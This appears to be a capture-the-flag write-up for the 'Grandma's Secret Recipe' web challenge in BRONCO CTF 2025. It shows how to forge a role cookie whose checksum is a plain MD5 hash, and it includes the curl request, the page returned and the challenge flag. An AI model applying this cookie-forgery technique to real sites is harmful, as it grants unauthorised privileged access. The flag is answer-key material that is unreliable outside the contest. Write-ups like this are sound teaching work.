--------------

### CTF-: BRONCO CTF 2025

--------------

![image](https://github.com/user-attachments/assets/701bde62-84df-4985-9561-4d9d69f1434e)

---------------

### CHALLENGES-:

----------------

- Web-:
 - Grandma's Secret Recipe
 - Mika's Autograph

----------------

### Grandma's Secret Recipe

-----------------

![image](https://github.com/user-attachments/assets/2ed8ef70-1f2c-4215-bed7-e6ca8c655f06)

------------------

- I checked  the curl shows 3 endpoints as seen below and that we are logged in as `kitchen helper`

![image](https://github.com/user-attachments/assets/7348f296-603a-4fd7-aa23-f1dfd254c47b)

- I ran `curl`  with `-v` for a verbose output which will include request and response headers.I noticed the role header and checksum containing an hash.

![image](https://github.com/user-attachments/assets/08014ebd-b0dd-41b8-9d10-2e62b239b503)

- I computed the hash for the value `kitchen helper` in md5 and got the same hash.

![image](https://github.com/user-attachments/assets/729da742-65f6-4a4c-bf26-c07ad0ffac0e)

- In order to get the flag, we need to create an hash with the value `grandma` and pass it to the route `/grandma` to get the flag

```bash
❯ curl https://grandma.web.broncoctf.xyz/grandma -H "Cookie: role=grandma;checksum=a5d19cdd5fd1a8f664c0ee2b5e293167"

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grandma's Bakery</title>
    <style>
        body { font-family: 'Comic Sans MS', cursive, sans-serif; background-color: #ffe5b4; text-align: center; }
        .container { margin-top: 50px; padding: 20px; background: #fff8dc; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); }
        .flag { font-weight: bold; color: green; }
        .btn { display: inline-block; padding: 10px 20px; margin: 10px; background-color: #d2691e; color: white; text-decoration: none; border-radius: 5px; }
        h1 { color: #8b0000; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Grandma's Bakery!</h1>
        <p>Grandma&#39;s Secret Recipe: </p>
        <p class="flag">Flag: bronco{grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact}</p>
        <br>
        <a class="btn" href="/login">Login</a>
        <a class="btn" href="/logout">Logout</a>
        <a class="btn" href="/grandma">Grandma's Pantry</a>
    </div>
</body>
</html>%
```

- Flag-: ```bronco{grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact}```




